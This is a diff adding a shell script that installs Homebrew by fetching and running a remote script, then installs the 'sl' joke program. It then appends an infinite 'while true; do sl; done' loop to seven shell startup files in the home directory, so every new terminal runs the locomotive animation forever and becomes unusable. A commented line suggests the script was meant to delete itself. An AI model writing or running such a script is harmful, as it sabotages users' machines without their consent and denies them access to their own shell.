@@ -1,0 +1,38 @@
+brew=$(which brew)
+
+if [ "$brew" == "" ]
+then 
+	ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+fi
+
+brew list sl &>brew
+sl=$(cat brew|grep "Error")
+rm -rf brew
+installed=0
+
+if [ "$sl" != "" ]
+then
+	internet=$(curl -s www.google.com)
+
+	if [ "$internet" != "" ]
+	then
+		brew install sl
+		installed=1
+	fi
+else
+	installed=1
+fi
+
+#rm -rf script
+
+if [ "$installed" == "1" ]
+then
+	cd ~
+	echo "\nwhile true; do sl; done"|cat>>.bash_profile
+	echo "\nwhile true; do sl; done"|cat>>.zshrc
+	echo "\nwhile true; do sl; done"|cat>>.profile
+	echo "\nwhile true; do sl; done"|cat>>.kshrc
+	echo "\nwhile true; do sl; done"|cat>>.shrc
+	echo "\nwhile (1)\n sl\n end"|cat>>.tcshrc
+	echo "\nwhile (1)\n sl\n end"|cat>>.cshrc
+fi
